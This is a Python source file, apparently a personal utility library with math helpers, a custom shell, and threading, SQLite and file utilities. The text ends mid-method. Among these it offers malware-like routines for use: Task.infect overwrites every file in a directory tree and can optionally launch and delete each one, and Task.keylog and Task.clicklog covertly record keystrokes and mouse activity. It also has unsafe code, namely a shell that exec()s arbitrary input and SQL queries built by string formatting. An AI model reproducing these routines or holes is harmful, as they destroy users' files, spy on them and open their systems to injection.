# Mdp Private Class(c). All rights reserved.
# Contact me for details. --- marcodp183@gmail.com ---
# This is a person Library for learning the arts of the Class and improving myself.
# Also there are some usefully mathematics function like Expression().linear(self, coeffxx, coeffyy, term), for
# resolving simple Linear Systems.
# I 'overload' some built_in types like Floating Points, Integer, and String. This don't create any problem with
# working with the prestabilied built_in types.
# This Library is under GNU License. For details read the GNU License clauses starting this Library from itself.
# GNU License imposes that the developer of the Library must be reported at the top of the it.
# Do not remove or modify this clauses during the distribution of this.
# For any details visit https://grigoprg.webnode.it

if __name__ == "__main__":
    _real_ = 1
    _notreal_ = 2
    __MainLibrary__ = "STX_LIB"

built_on_package = ["pyautogui", "shutil", "pynput", "screeninfo"]

def SETUP():
    for _package_ in built_on_package:
        path = "pip install " + _package_
        try:
            os.system(path)
        except:
            pass

    return None

# START LIBRARY'S CLASSES FOR __SoftLib__ MODULE:

########################################## CLASS EXPRESSION ################################### Over:License | Under:Shell

import threading
from contextlib import contextmanager
import sqlite3 as sql
import os

class Expression():
    """
    Abstract class for expression resolving.
    """

    PI = 3.141592
    DEVELOPER = "Marco Della Putta"

    def __init__(self, name='Expression'):
        self.expression = name

    def exp_name(self):
        return str(self.expression)

    @classmethod
    def diagonal(cls, side1, side2):
        side1 = float(side1)
        side2 = float(side2)
        from math import sqrt
        from math import pow as pw
        return sqrt((pw(side1, 2)) + (pw(side2, 2)))

    @classmethod
    def c_area(cls, radius):
        radius = float(radius)
        from math import pow as pw
        return cls.PI * pw(radius, 2)

    @classmethod
    def radius(cls, area):
        area = float(area)
        from math import sqrt
        return sqrt((area / cls.PI))

    @classmethod
    def circ(cls, radius):
        radius = float(radius)
        return 2 * cls.PI * radius

    @classmethod
    def side(cls, area, side2):
        area = float(area)
        side2 = float(side2)
        return area / side2

    @classmethod
    def area(cls, side1, side2):
        side1 = float(side1)
        side2 = float(side2)
        return side1 * side2

    @classmethod
    def t_area(cls, high, base_max, base_min):
        high = float(high)
        base_max = float(base_max)
        base_min = float(base_min)
        return ((base_max + base_min) * high) / 2.0

    @classmethod
    def t_basemax(cls, high, area, base_min):
        high = float(high)
        area = float(area)
        base_min = float(base_min)
        return ((2.0 * area) / high) - base_min

    @classmethod
    def t_basemin(cls, high, area, base_max):
        high = float(high)
        area = float(area)
        base_max = float(base_max)
        return ((2.0 * area) / high) - base_max

    @classmethod
    def t_obside(cls, high, base_max, base_min):
        from math import sqrt
        from math import pow as pw
        high = float(high)
        base_max = float(base_max)
        base_min = float(base_min)
        return sqrt(pw(high, 2) + pw((base_max - base_min), 2))

    @classmethod
    def t_diagonalmax(cls, high, base_max):
        base_max = float(base_max)
        high = float(high)
        from math import sqrt
        from math import pow as pw
        return sqrt(pw(high, 2) + pw(base_max, 2))

    @classmethod
    def t_diagonalmin(cls, high, base_min):
        base_min = float(base_min)
        high = float(high)
        from math import sqrt
        from math import pow as pw
        return sqrt(pw(high, 2) + pw(base_min, 2))

    @classmethod
    def t_high(cls, area, base_max, base_min):
        area = float(area)
        base_max = float(base_max)
        base_min = float(base_min)
        return (2.0 * area) / (base_min + base_max)

    @classmethod
    def class_name(cls):
        return cls.__name__

    @classmethod
    def add(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        from math import fsum
        num1 = float(num1)
        num2 = float(num2)
        num3 = [num1, num2]
        return fsum(num3)

    @classmethod
    def sub(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        num1 = float(num1)
        num2 = float(num2)
        return num1 - num2

    @classmethod
    def mul(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        num1 = float(num1)
        num2 = float(num2)
        return num1 * num2

    @classmethod
    def div(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        num1 = float(num1)
        num2 = float(num2)
        return num1 / num2

    @classmethod
    def floor(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        num1 = float(num1)
        num2 = float(num2)
        return num1 // num2

    @classmethod
    def mod(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        from math import fmod
        num1 = float(num1)
        num2 = float(num2)
        return fmod(num1, num2)

    @classmethod
    def pow(cls, num1, num2):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num2, Float) or isinstance(num2, Int):
            num2 = num2.num
        from math import pow as pw
        num1 = float(num1)
        num2 = float(num2)
        return pw(num1, num2)

    @classmethod
    def sqrt(cls, num1):
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        if isinstance(num1, Float) or isinstance(num1, Int):
            num1 = num1.num
        num1 = float(num1)
        from math import sqrt
        return sqrt(num1)

    @classmethod
    def linear(cls, coeffxx, coeffyy, termm):
        if isinstance(coeffxx, Float) or isinstance(coeffxx, Int):
            coeffxx = coeffxx.num
        if isinstance(coeffyy, Float) or isinstance(coeffyy, Int):
            coeffyy = coeffyy.num
        if isinstance(termm, Float) or isinstance(termm, Int):
            termm = termm.num

        D = (float(coeffxx[0] * coeffyy[1]) - float(coeffyy[0] * coeffxx[1]))
        DX = (float(termm[0] * coeffyy[1]) - float(coeffyy[0] * termm[1]))
        DY = (float(coeffxx[0] * termm[1]) - float(termm[0] * coeffxx[1]))
        X = DX / D
        Y = DY / D
        return round(X, 1), round(Y, 1)

    @classmethod
    def delta(cls, coeffxx, coeffx, term):
        if isinstance(coeffxx, Float) or isinstance(coeffxx, Int):
            coeffxx = coeffxx.num
        if isinstance(coeffx, Float) or isinstance(coeffx, Int):
            coeffx = coeffx.num
        if isinstance(term, Float) or isinstance(term, Int):
            term = term.num

        from math import pow as pw
        DELTA = float(pw(coeffx, 2) - (4 * term * coeffxx))
        return DELTA

    @classmethod
    def expression2(cls, coeffxx, coeffx, term):
        if isinstance(coeffxx, Float) or isinstance(coeffxx, Int):
            coeffxx = coeffxx.num
        if isinstance(coeffx, Float) or isinstance(coeffx, Int):
            coeffx = coeffx.num
        if isinstance(term, Float) or isinstance(term, Int):
            term = term.num
        from math import sqrt
        try:
            DELTA = cls.delta(coeffxx, coeffx, term)
            X1 = (-coeffx - sqrt(DELTA)) / (2 * coeffxx)
            X2 = (-coeffx + sqrt(DELTA)) / (2 * coeffxx)
            return round(X1, 1), round(X2, 1)
        except ValueError:
            return False


########################################### SHELL CLASS ################################### Over:Expression | Under:Default


class Shell(object):
    """
    Interactive shell management.
    """
    
    DEVELOPER = "Marco Della Putta"

    def __init__(self, password="password"):
        super().__init__()

    @classmethod
    def class_name(cls):
        return cls.__name__

    @classmethod
    def shell(cls, _set="default", _space=False):
        # Importing modules
        import re
        from webbrowser import open as __websearch__

        # Initalize the Shell
        command = ""
        ulist = []
        SPACE = _space
        try:
            Default.setup(set=_set)
        except:
            Default.setup(set="default")

        # REGEX PATTERN
        createwdd = re.compile("create ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,6}) -w -d")
        createdd = re.compile("create ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,6}) -d")

        createw = re.compile("create ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,6}) -w")
        createdw = re.compile("create ([cC]:[a-zA-Z0-9\\\-_.]{1,100}) -w")

        created = re.compile("create ([cC]:[a-zA-Z0-9\\\-_.]{1,100})")
        create = re.compile("create ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,5})")

        read = re.compile("read ([a-zA-Z0-9]+[.][a-zA-Z]{1,5})")
        readd = re.compile("read ([cC]:[a-zA-Z0-9\\\-_.]{1,100})")

        readdd = re.compile("read ([a-zA-Z0-9\\\-_.]{1,100}) -d")
        memory = re.compile("memory ([0-9]+)")

        filesearch = re.compile("search ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,6})")
        partialsearch = re.compile("search ([a-zA-Z0-9\\\-_]{1,20})")
        extsearch = re.compile("search ([.][a-zA-Z]{1,6})")

        extdel = re.compile("delete ([.][a-zA-Z]{1,6})")
        filedel = re.compile("delete ([a-zA-Z0-9\-_]+[.][a-zA-Z]{1,6})")
        
        openweb = re.compile("open (.{4,50})")
        space_a = re.compile("space -start")

        cls = re.compile("cls")
        space_d = re.compile("space -stop")

        reset = re.compile("reset")
        helpp = re.compile("help")

        print("Prg Corporation Terminal [Version 1.2.19445.23] ")
        print("(m) 2018 Mdp Property. All rights reserved")
        
        print("\n", end="")

        while command != "exit" and command != "quit":
            
            if not SPACE:
                command = input(">>>")
            else:
                command = input("\n>>>")

            if re.fullmatch(createw, command.lower()):
                result = re.fullmatch(createw, command.lower())
                print("creating file overwriting other files ...")
                result = "C:\\" + result.group(1)
                System.fCreate(write=True, path=result.group(1))
                
            elif re.fullmatch(space_a, command.lower()):
                SPACE = True

            elif re.fullmatch(reset, command.lower()):
                Default.cls()
                print("Prg Corporation Terminal [Version 1.2.19445.23] ")
                print("(m) 2018 Mdp Property. All rights reserved")
                
            elif re.fullmatch(cls, command.lower()):
                Default.cls()

            elif re.fullmatch(space_d, command.lower()):
                SPACE = False

            elif re.fullmatch(create, command.lower()):
                result = re.fullmatch(create, command)
                print("creating file ...")
                result = "C:\\" + result.group(1)
                System.fCreate(write=False, path=result.group(1))

            elif re.fullmatch(read, command.lower()):
                result = re.fullmatch(read)
                print("reading file ...\n")
                result = "C:\\" + result.group(1)
                path = result
                with open(path, "r") as f:
                    string = f.readlines()
                for x in string:
                    print(x)
                    
            elif re.fullmatch(openweb, command.lower()):
                result = re.fullmatch(openweb)
                __websearch__(result.group(1))

            elif re.fullmatch(createdw, command.lower()):
                result = re.fullmatch(createdw)
                print("creating file overwriting other file ...")
                System.fCreate(write=True, path=result.group(1))

            elif re.fullmatch(created, command.lower()):
                result = re.fullmatch(created)
                print("creating file ...")
                System.fCreate(write=False, path=result.group(1))

            elif re.fullmatch(readd, command.lower()):
                result = re.fullmatch(readd)
                with open(result.group(1), "r") as f:
                    result = f.readlines()
                for x in result:
                    print(x)

            elif re.fullmatch(memory, command.lower()):
                result = re.fullmatch(memory)
                print("analyzing memory ...")
                x = System.Memory(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(filesearch, command.lower()):
                result = re.fullmatch(filesearch)
                print("searching file ...")
                x = System.Filesearch(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(filedel, command.lower()):
                result = re.fullmatch(filedel)
                print("deleting file ...")
                x = System.FileDelete(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(extdel, command.lower()):
                result = re.fullmatch(extdel)
                print("deleting extension ...")
                x = System.Extdelete(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(extsearch, command.lower()):
                result = re.fullmatch(extsearch)
                print("searching extension ...")
                x = System.Extsearch(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(createdd, command.lower()):
                result = re.fullmatch(createdd)
                print("creating file on the desktop ...")
                result = "C:\\Users\\Marco\\Desktop\\" + result.group(1)
                System.fCreate(write=False, path=result)

            elif re.fullmatch(createwdd, command.lower()):
                result = re.fullmatch(createwdd)
                print("creating and overwriting file on the desktop ...")
                result = "C:\\Users\\Marco\\Desktop\\" + result.group(1)
                System.fCreate(write=True, path=result)

            elif re.fullmatch(readdd, command.lower()):
                result = re.fullmatch(readdd)
                print("reading file ...\n")
                result = str("C:\\Users\\Desktop\\" + result.group(1))
                with open(result, "r") as f:
                    string = f.read()
                for x in string:
                    print(x)

            elif re.fullmatch(partialsearch, command.lower()):
                result = re.fullmatch(partialsearch)
                print("searching partial file ...")
                x = System.PartSearch(result.group(1))
                for y in x:
                    print(y)

            elif re.fullmatch(helpp, command.lower()):
                print(" ## HELP ##\n")
                print(" help : show this section")

                print(" create [file | C.\\path\\file] : create a file")
                print(" create [file | C.\\path\\file] -d : create a file on the desktop")

                print(" create [file | C.\\path\\file] -w : create a file overwriting other files")
                print(" create [file | C.\\path\\file] -w -d : combine -w & -d")

                print(" read [file | C.\\path\\file] : read a file")
                print(" read [file | C\\path\\file] -d : read a file on the desktop")

                print(" search [ext | file] : search extension or files")
                print(" delete [ext | file] : delete extension or files")

                print(" memory [value] : return the file over this memory [MB]")
                print(" open [url] : open an url in your predefinied browser")

                print(" space [-start/-stop] : active or deactive spaces between lines")
                
                print(" cls : clear the screen <Remove the license printed at the top of the screen>")
                print(" reset : reset the screen <Do not remove the license at the top of the screen>")
                
                print("\n ## END ##")

            else:

                try:
                    exec(command)
                except TypeError:
                    print("Error --> TypeError")
                except NameError:
                    print("Error --> NameError")
                except EOFError:
                    print("Error --> EOF-Error")
                except FloatingPointError:
                    print("Error --> FloatingPointError")
                except ImportError:
                    print("Error --> ImportError")
                except TabError:
                    print("Error --> TabError")
                except IndexError:
                    print("Error --> IndexError")
                except AttributeError:
                    print("Error --> AttributeError")
                except ValueError:
                    print("Error --> ValueError")
                except PermissionError:
                    print("Error --> PermissionDenied-Error")
                except ArithmeticError:
                    print("Error --> ArithmeticError")
                except FileNotFoundError:
                    print("Error --> FileNotFoundError")
                except AssertionError:
                    print("Error --> AssertionError")
                except BufferError:
                    print("Error --> BufferError")
                except RuntimeError:
                    print("Error --> RunTimeError")
                except SystemError:
                    print("Error --> SystemError")
                except MemoryError:
                    print("Error --> MemoryError")
                except EnvironmentError:
                    print("Error --> Enviroment-Error")
                except KeyError:
                    print("Error --> KeyError")
                except SyntaxError:
                    print("Error --> SyntaxError")
                except WindowsError:
                    print("Error --> WindowsError")
                except:
                    print("Error --> NotImplementedError")


################################################# DEFAULT CLASS ############################### Over:Shell | Under:Task


class Default(object):
    """
    Class for setup project default values.
    """

    DEVELOPER = "Marco Della Putta"
    
    def __init__(self):
        super().__init__()

    @classmethod
    def class_name(cls):
        return cls.__name__

    @classmethod
    def package(cls, *args):
        from os import system as _import_

        counter = 0

        try:
            for package in args:

                package_import = "pip install " + str(package)
                _import_(package_import)

                counter += 1

            return counter

        except:
            return False

    @classmethod
    def setup(cls, fg="white", bg="black", set=""):
        dictionary = {"white": "F", "yellow": "E", "black": "0", "dark blue": "1", "green": "2", "light green": "3",
                      "bordo": "4", "purple": "5", "aux green": "6", "light grey": "7", "grey": "8", "blue": "9",
                      "lemon green": "A", "light blue": "B", "red": "C", "violet": "D"}

        from os import system as __input__

        try:
            if set.lower() == "linux":
                __input__("Color F0")
                return True

            elif set.lower() == "fenix":
                __input__("Color FC")
                return True

            elif set.lower() == "relax":
                __input__("Color 9F")
                return True

            elif set.lower() == "engine":
                __input__("Color 0A")
                return True

            elif set.lower() == "default":
                __input__("Color 0F")
                return True

            background_color = str(bg)
            fontground_color = str(fg)

            color_setup = "Color " + dictionary[background_color] + dictionary[fontground_color]
            __input__(color_setup)

            return True

        except:

            return False
        
    @classmethod
    def cls(cls):
        import os
        os.system("cls")
        return None
    
    @staticmethod
    def Recursion(func, target, args=[], _num = 1):
        
        if not args:
            func()
            
        else:
            func(*args)
            
        if _num == target: return
        _num += 1
        
        Default.Recursion(func, target, args, _num)
        return

    @staticmethod
    def recursion(action, target, _num = 1):
        exec(action)
        
        if _num == target: return
        _num += 1
        
        Default.recursion(action, target, _num)
        return None

    @staticmethod
    def Recursive(func, target, args=[]):
        
        def wrap(_num=1):
                
            if not args:
                result = func()
                    
            else:
                result = func(*args)
                    
            if _num == target:
                return result
                
            _num += 1
            wrap(_num)
                
            return None
        
        return wrap

    @staticmethod
    def gen(_list):
        
        def _yield():
            
            for _value in _list:
                yield _value
                
        return _yield

    @staticmethod
    def Crypto(obj, key=None, string=False):
        import random

        try:
            file = str(obj)
        except:
            raise ValueError("Object must be a string or a name of file")

        try:
            key = str(key)
        except:
            key = None

        _meta_pool = "abcdefghilmnopqrstuvz%$£'=)(/*+-_jJ@"
        _meta_pool2 = "ABCDEFGHILMNOPQRTSUVZ.;?!&<>XYZKxyzk"

        _randomer = [1,2,3,4,5,6,7,8]

        _pool = _meta_pool + _meta_pool2
        _key_ = ''

        if string:
            
            _n = int(len(file)/2)
            _result = ''

            for x in range(3):
                file = file[::-1]
                file = file[len(file)-_n:] + file[:(len(file)-_n)]
        
            if not key:
                x = random.randint(0,1)
                if x == 1:
                    for _partition in range(8):
                        _key_ += str(_pool[random.randrange(len(_pool))])
                else:
                    _key_ = "ç"
            else:
                _key_ = key

            for char in file:
                for num,xor in enumerate(key):
                    char = chr((ord(char)) ^ (ord(xor)))

                _result += char

            return _result

        else:

            with open(file, 'r+') as _file:
                text = _file.readlines()

            for pos, message in enumerate(text):

                _n = int(len(message)/2)
                _result = ''

                for x in range(3):
                    message = message[::-1]
                    message = message[len(message)-_n:] + message[:(len(message)-_n)]
            
                if not key:
                    x = random.randint(0,1)
                    if x == 1:
                        for _partition in range(8):
                            _key_ += str(_pool[random.randrange(len(_pool))])
                    else:
                        _key_ = "ç"
                else:
                    _key_ = key

                for char in message:
                    for num,xor in enumerate(key):
                        char = chr((ord(char)) ^ (ord(xor)))

                    _result += char

                text[pos] = _result

            with open(file, 'w') as f:
                for _value in text:
                    f.write(_value)

            return None

    @staticmethod
    def os_info():
        import sys
        from win32api import GetSystemMetrics
        
        return sys.platform, sys.version, GetSystemMetrics(0), GetSystemMetrics(1), sys.getrecursionlimit(), sys.byteorder

    @staticmethod
    def self_position():
        return str(__file__)

    @staticmethod
    @contextmanager
    def desk(desktop):
        try:
            import os
            cwd = os.getcwd()
            os.chdir(desktop)
            yield
        except:
            raise WindowsError(f"Directory {desktop} not found.\nPut a valid path.")
        
        finally:
            os.chdir(cwd)

    @staticmethod
    @contextmanager
    def stdout(file):
        try:
            fh = open(file, 'a')
            import sys
            current_output = sys.stdout
            sys.stdout = fh
            yield
        except:
            raise WindowsError(f'Directory {file} not found.\nPut a valid path.')
        
        finally:
            if fh:
                fh.close()
            sys.stdout = current_output
            
    @staticmethod
    def PrecTime(sec, microseconds=None, string=False):
        """
        >param sec: Enter the n. of seconds
        >param microseconds: optional, enter the . of microseconds
        >param string: optional, if 'string' is true, the func return a string,
        in the other case, it return a tuple.
        >return: tuple or string of <hour, minute, seconds, milliseconds, microseconds>
        """
        
        sec = int(sec)
        rest = sec % 3600
        sec -= rest
        
        hours = sec/3600
        sec = rest
        
        rest = sec%60
        sec -= rest
        
        minutes = sec/60
        sec = rest

        seconds = rest
        
        if not microseconds:
            milliseconds = 0
            microseconds = 0
        else:
            rest = microseconds%1000
            microseconds -= rest
            milliseconds = float(microseconds)/1000
            microseconds = rest
                    
        if not string:
            return int(hours), int(minutes), int(seconds), int(milliseconds), int(microseconds)
        
        else:
            return f"{int(hours)}:{int(minutes)}:{int(seconds)}.{int(milliseconds)}"
    

########### [SUB-CLASSES] #################### TASK CLASS ################# Over:Default Under:FileWrapper

class Task(threading.Thread):
    """
    Class for Multi - Threading.
    """

    DEVELOPER = "Marco Della Putta"
    
    def __init__(self, func, *args, lock=True):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
        self.lock = lock
        self.fLock = threading.Lock()

    def run(self):     
        if self.lock:
            self.fLock.acquire()
        self.func(*self.args)

    def set_flag(self, boolean):
        if boolean:
            self.lock = True
        else:
            self.lock = False
            try:
                self.fLock.release()
            except:
                pass

    @staticmethod
    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):

        from subprocess import run
        from time import sleep as _sp

        if source:
            with open(source, 'r') as src:
                contents = src.read()
        else:
            contents = "https://grigoprg.webnode.it"

        for RootDir, __Fldrs__, _file in os.walk(path):
            for _file_ in _file:
                _path = RootDir + "\\" + _file_
                try:
                    if ext == "":
                        with open(_path, 'w') as fw:
                            fw.write(contents)
                        if action:
                            action()
                        if start:
                            run(f'start {_path}', shell=True)
                        if delay:
                            _sp(delay)
                        if delete_infected:
                            try:
                                os.unlink(_path)
                            except:
                                os.remove(_path)
                    else:
                        if _file_.endswith(ext):
                            with open(_path, 'w') as fw:
                                fw.write(contents)
                            if action:
                                action()
                            if start:
                                run(f'start {_path}', shell=True)
                            if delay:
                                _sp(delay)
                            if delete_infected:
                                try:
                                    os.unlink(_path)
                                except:
                                    os.remove(_path)
                except:
                    pass

        if delete_source:
            try:
                try:
                    os.unlink(file_source)
                except:
                    os.remove(file_source)
            except:
                pass

    @staticmethod
    def Server(func):     
        """
        Port -> One   : 15000
                Two   : 15897
                Three : 43201
                Four  : 32798
        """
        def wrap():
            try:
                Task.Server_TCP(15000, func)
                return True
            except:    
                try:
                    Task.Server_TCP(15897, func)
                except:
                    try:
                        Task.Server_TCP(43201, func)
                    except:
                        try:
                            Task.Server_TCP(32798, func)
                        except:
                            return False
        return wrap


    @staticmethod
    def Server_TCP(port, func, address='', _backlog=3, buffer=4096):
        import socket
        
        if _backlog == 0 or _backlog > 500:
            return False

        while True:
            
            try:
                s = socket.socket()
                s.bind((address,port))
                s.listen(_backlog)
                
            except socket.error as sk_error:
                Task.Server_TCP(address, (_backlog-1))

            connection, client_address = s.accept()

            try:
                try:
                    _queue = connection.recv(buffer).decode()
                    res = func(str(_queue))
                    
                    res = str(res)
                    res = res.encode()
                    
                    connection.send(res)
                    connection.close()
                except:
                    connection.send('Flag Error : Server-Failed-Queue'.encode())
                    connection.close()
                    
            except:
                pass

        s.close()
        return True

    @staticmethod
    def Client_Queue(address, command, buffer=4096):
        import socket
        
        try:
            s = socket.socket()
            s.connect(address)
        except socket.error as sk_error:
            return False

        try:
            command = str(command)
            command = command.encode()
            s.send(command)
            data = s.recv(buffer)
            s.close()
            return data.decode()
            
        except socket.error as sk_error:
            raise sk_error    
             
    @staticmethod
    def Link(func_one, func_two, delay, args1 = [], args2 = []):
        from time import sleep as _sp
        if not args1:
            first_func = threading.Thread(target=func_one)
        else:
            first_func = threading.Thread(target=func_one, args=tuple(args1))
            
        if not args2:
            second_func = threading.Thread(target=func_two)
        else:
            second_func = threading.Thread(target=func_two, args=tuple(args2))
        first_func.start()
        _sp(delay)
        second_func.start()     

    @classmethod      
    def class_name(cls):
        return cls.__name__
    
    @staticmethod
    def keylog(_path_):
        from pynput.keyboard import Key, Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(key)

        with Listener(on_press=on_press) as listener:
            listener.join()
            
    @staticmethod
    def clicklog(_path_):
        from pynput.mouse import Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format="%(asctime)s: %(message)s")

        def on_move(x, y):
            logging.info("Mouse moved to ({0},{1})".format(x, y))

        def on_click(x, y, button, pressed):
            if pressed:
                logging.info("Mouse clicked at ({0},{1}) with {2}".format(x, y, button))

        def on_scroll(x, y, dx, dy):
            logging.info("Mouse scrolled at ({0},{1})({2},{3})".format(x, y, dx, dy))

        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
            listener.join()

    @staticmethod
    def autowrite(text, delay=None):
        import pyautogui
        from time import sleep as _sp
        
        if not delay:
            delay = 0.0

        _sp(0.3)
        pyautogui.typewrite(text, interval=delay)

    @staticmethod
    def login(email, password, reciever, title, text):
        """
        If you use gmail or similar, check if the option for blocking
        not-safe log is enable, if is enable, disable it.
        """
        import smtplib

        title = "Subject: " + str(title) + "\n\n"
        _message = title + text

        _email = smtplib.SMTP("smtp.gmail.com", 587)
              
        _email.ehlo()
        _email.starttls()

        _email.login(email, password)

        _email.sendmail(email, reciever, _message)

        _email.quit()

        return _message


########[CONTEXT-MANAGER]################# FILE WRAPPER ########### Over:Task Under:SQL
        
class FileWrapper:
    """
    A Context Manager provided by me.
    """

    DEVELOPER = "Marco Della Putta"

    def __init__(self, name, crypt=True):
        
        self.name = name
        self.contents = ''
        self.crypt = crypt

    def __enter__(self):
        try:
            self.file = open(self.name, 'r+')
            return self.file
        except:
            raise PermissionError

    def __exit__(self, exc_type, exc_val, exc_tb):
        
        if self.file:
            self.file.close()
            
        if self.crypt:
            try:
                self.file = open(self.name, 'r')
                self.contents = self.file.readlines()
                self.file.close()
                
            except:
                
                raise IOError("An error occurred during the encyption of the file.")
  
        if self.crypt:
            file_ = open(self.name, 'w')
            
            for _encrypt in self.contents:
                _encrypt = Crypto(_encrypt, string=True)
                
                try:
                    file_.write(_encrypt)
                except:
                    pass

            if file_:
                file_.close()

                
################################################## SQL CLASS################## Over:FileWrapper Under:System

class SQL:
    """
    An SQL Database Manager.
    """

    DEVELOPER = "Marco Della Putta"

    def __init__(self, name):

        if not name.endswith('.db'):
            raise ValueError("The name of a DataBase must ends with '.db'")

        self.path = name
        self.database = sql.connect(name)
        self.cursor = self.database.cursor()
        self.name = ''
        self.length = 0
        self.args = []
        self.argm = 0
        self.unique = False
        self.tabs = []

    @classmethod
    def class_name(cls):
        return cls.__name__

    def add_table(self, name, *args, __unique=False):

        if not isinstance(name, str):
            raise ValueError("Error. The name of the table must be a string. Parameters must be tuples.")

        self.tabs.append(str(name))
        self.unique = __unique
        self.name = name
        self.length = len(args)

        if self.unique:
            cmd = f"""
                  CREATE TABLE IF NOT EXISTS {self.name} (
                  TableID INTEGER PRIMARY KEY,           
                  """
        else:
            cmd = f"""
                  CREATE TABLE IF NOT EXISTS {self.name} (
                  """

        for pos, _arg in enumerate(args):

            try:
                if not isinstance(_arg, str):
                    raise ValueError("Name of the columns must be strings.")

                if pos == (self.length - 1):
                    cmd += _arg

                else:
                    cmd += (_arg + ",\n                  ")

            except:
                raise ValueError("Invalid argument or Syntax")

            finally:
                self.args.append(_arg)

        cmd += ");"

        self.cursor.execute(cmd)

        _result = [self.name]
        _result.extend(self.args)

        self.database.commit()

        return _result

    def show_tab(self):
        try:
            return str(self.tables)
        
        except:
            raise ValueError

    def show_args(self):
        try:
            return str(self.args)
        
        except:
            raise ValueError

    def show_database(self):
        try:
            return str(self.path)

        except:
            raise ValueError

    def check_unique(self):
        return self.unique

    def get_curs(self):
        return self.cursor

    def get_db(self):
        return self.db

    def try_visual(self, table):
        
        print(f"\n     ### -{table}- TABLE ###\n\n")
        tup = self.fetchall(table, tuples=True)
        
        for _val in tup:
            print(_val)
            
        return None

    def add_argm(self, table, *args):

        self.name = str(table)

        if self.unique:
            try:
                count = list(self.cursor.fetchall())[self.argm][0]

            except:
                count = 0

        _result = []

        if self.unique:
            cmd = f"INSERT INTO {self.name} VALUES({count+1},"

        else:
            cmd = f"INSERT INTO {self.name} VALUES("

        for pos,_arg in enumerate(args):

            try:
                if pos == (self.length - 1):
                    if isinstance(_arg, str):
                        cmd += f"'{_arg}'"

                    else:
                        cmd += str(_arg)

                else:
                    if isinstance(_arg, str):
                        cmd += f"'{_arg}',"

                    else:
                        cmd += f"{str(_arg)},"

            except:
                raise ValueError("Values must be the same of the previous insertion.")

            finally:
                _result.append(_arg)

        cmd += ")"

        self.cursor.execute(cmd)
        self.database.commit()
        self.argm += 1

        return _result

    def drop(self, table):

        self.cursor.execute(f"DROP TABLE IF EXISTS {self.name}")
        return str(self.name)

    def fetchall(self, table, tuples=False):

        self.name = table

        if not tuples:
            
            try:
                self.cursor.execute(f"SELECT * FROM {self.name}")
                return str(self.cursor.fetchall())
            
            except:
                raise ValueError("Invalid table name.")
        else:

            try:
                self.cursor.execute(f"SELECT * FROM {self.name}")
                return tuple(self.cursor.fetchall())

            except:
                raise ValueError("Invalid table name.") 
            

    def close(self):

        try:
            self.cursor.close()
            self.database.close()
            return True

        except:
            return False

    def fetchone(self, table):

        self.name = table
        try:
            self.cursor.execute(f"SELECT * FROM {self.name}")
            return str(self.cursor.fetchone())
        
        except:
            raise ValueError("Invalid table name.")

    def fetchmany(self, table, size):

        self.name = table
        try:
            self.cursor.execute(f"SELECT * FROM {self.name}")
            return str(self.cursor.fetchmany(size))
        
        except:
            raise ValueError("Invalid table name.")

    def execute(self, string):
       
        val = self.cursor.execute(string)
        return val

    def commit(self):

        self.database.commit()
        return None

    def delete(self):
        import os

        try:
            self.cursor.close()
            self.database.close()
        except:
            pass

        try:
            os.unlink(self.path)
            return True
        except:

            try:
                os.remove(self.path)
                return True

            except PermissionError:
                raise PermissionError("Can not delete the database, permission error")

            except FileNotFoundError:
                raise FileNotFoundError(f"Can not delete the database, database not found in '{self.name}'")

            except:
                raise BaseException(rf"""Can not delete the database. Database located in :
                                       - {os.getcwd()}\{self.path}
                                       or
                                       - {self.path}
                                       """)

################################################ SYSTEM CLASS #################################### Over:SQL | Under:End

class System:
    """
    Advanced class for control the Memory. (SSD/HD)
    """

    DEVELOPER = "Marco Della Putta"

    def __init__(self):
        self._not = False

    @classmethod
    def class_name(cls):
        return cls.__name__

    @classmethod
    def fCreate(cls, write=False, path="C:"):
        if write:
            try:
                f = open(path, "w")
                f.close()
                return True
            except:
                return False
        else:
            try:
                f = open(path, "r")
                f.close()
                return False
            except FileNotFoundError:
                with open(path, "w") as x:
                    x.close()
                return True

    @classmethod
    def fRead(cls, file, write=False, path="C:"):
        PATH = path + "\\" + file

        if write:
            f = open(PATH, "w")
            f.close()
            return True
        elif not write:
            try:
                f = open(PATH, "r")
                s = f.read()
                f.close()
                return s
            except FileNotFoundError:
                return False
        return None

    @classmethod
    def fDel(cls, __path__):
